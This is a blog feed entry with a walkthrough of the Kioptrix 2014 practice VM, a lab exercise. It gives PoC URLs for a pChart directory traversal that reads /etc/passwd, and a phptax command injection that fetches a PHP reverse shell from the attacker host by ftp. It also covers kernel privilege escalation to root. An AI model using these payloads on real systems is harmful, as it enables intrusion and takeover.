<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: kioptrix2014 | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/kioptrix2014/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-12-08T05:09:03-05:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Kioptrix 2014]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014/"/>
    <updated>2015-05-25T00:54:33-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014</id>
    <content type="html"><![CDATA[<p>This is probably the last/final version of Kioptrix challenge VM, after played with all of those well designed vulnerable boxes, I would say they are challenging and enjoyable, not only for juniors like me :) but also the Pen tester pros will make fun from them. Cheers to <strong><em>loneferret</em></strong> and <strong><em>haken29a</em></strong>.</p>

<p>So back to Kioptrix 2014, more details can be found in this vulnhub website <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">link</a>, which including VM download links, walkthroughs, bug fixes (highly recommended to read Description when first running the VM) and blah blah blah &hellip;</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/128762761?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Kioptrix 2014 (<em>10.10.10.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><a href="https://www.exploit-db.com/exploits/21665/">phptax 0.8 - Remote Code Execution Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/31173/">pChart2.1.3 Directory Traversal Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering and interacting with the web server [firefox, wappalyzer addon]</li>
<li>Exploit Remote Code Execution and upload reverse php webshell [php-reverse-shell]</li>
<li>Exploit local privilege escalation to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>I use netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80 and 8080 have been discovered and the web server is <font color="red">apache 2.2.21</font> running on <font color="red">FreeBSD system</font>.</p>

<p>Fire up NIKTO for web scanning but did not get much interesting results. Trying to access port 8080 from my FIREFOX browser but the access has been forbidden. So I turn to access port 80 on firefox. This time, it shows classic &ldquo;It works!&rdquo; page. After checking the source code, I found something interesting(hidden URL) in comments:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;!--  &lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">  -->
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure>
Looks like web application &ldquo;pChart version 2.1.3&rdquo; is running, so I searched &ldquo;pChart2.1.3 exploit&rdquo; in google and found &ldquo;<a href="https://www.exploit-db.com/exploits/31173/">Directory Traversal and Reflected XSS Vulnerability</a>&rdquo;.</p>

<p>By exploiting the &ldquo;Directory Traversal&rdquo; vulnerability, I can read some system files, such as <code>/etc/passwd</code> and apache configuration file <code>/usr/local/etc/apache22/httpd.conf</code> (note: this is <a href="https://www.freebsd.org/doc/handbook/network-apache.html">apache configuration file location in FreeBSD</a>, which is different from other Linux systems)</p>

<p>PoC:</p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../etc/passwd</code></p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../usr/local/etc/apache22/httpd.conf</code></p>

<p>From apache configuration file, I found the following configuration in the end of the file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="ni">&amp;lt;</span>VirtualHost *:8080&gt;
</span><span class='line'>    DocumentRoot /usr/local/www/apache22/data2<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span><span class="ni">&amp;lt;</span>Directory &quot;/usr/local/www/apache22/data2&quot;&gt;
</span><span class='line'>    Options Indexes FollowSymLinks
</span><span class='line'>    AllowOverride All
</span><span class='line'>    Order allow,deny
</span><span class='line'>    Allow from env=Mozilla4_browser
</span><span class='line'><span class="nt">&lt;/Directory&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here is the key to open port 8080, I changed the user-agent header to <code>Mozilla/4.0</code> (anything start with this string should bypass) by using Firefox addons <a href="https://addons.mozilla.org/En-us/firefox/addon/user-agent-switcher/">User Agent Switcher</a>.</p>

<p>After access 8080 again with new User-Agent Header, I found the web application &ldquo;phptax&rdquo; in URL: <code>http://10.10.10.132:8080/phptax/</code>. Then I searched &ldquo;phptax exploit&rdquo; in google and found the <a href="https://www.exploit-db.com/exploits/21665/">Remote Code Execution vulnerability</a>.</p>

<p>Due to this is FreeBSD system (the OSCP studying experences very helpful here :P), the nc reverse shell could not work, so I have to find other ways. I set up <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a> and FTP server on my Kali, then exploit remote code execution vulnerability to upload my php reverse shell (sh.php) to the target.</p>

<p>PoC:</p>

<p><code>http://10.10.10.132:8080/phptax/index.php?pfilez=1040d1-pg2.tob;ftp -4 -d -v ftp://offsec:offsec@10.10.10.131//sh.php;&amp;pdf=make</code></p>

<p>* <font color="red">Note</font>: There are other methods can be used to upload php reverse shell, for example, using NC. Please check other walkthroughs from the vulnhub <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/#walkthrough">link</a></p>

<p>Then I set up NC to listen on port 5555 and access the URL <code>http://10.10.10.132:8080/phptax/sh.php</code> to trigger the reverse shell connect back to my NC.</p>

<p><img class="left" src="/downloads/kioptrix2014/1.png"></p>

<p>* <font color="red">Note</font>: Metasploit framework also provides an automatic exploit method: &ldquo;<strong><em>exploit/multi/http/phptax_exec</em></strong>&rdquo;</p>

<p><img class="left" src="/downloads/kioptrix2014/2.png"></p>

<p>Now, I have already got in with limited privilege. After some local enumeration, I searched &ldquo;freebsd 9 exploit&rdquo; in google and found two working exploits:</p>

<ul>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<p>After upload any one of the exploits, compiled with gcc and run it to get ROOT.</p>

<p><img class="left" src="/downloads/kioptrix2014/3.png"></p>

<p><img class="left" src="/downloads/kioptrix2014/4.png"></p>
]]></content>
  </entry>
  
</feed>
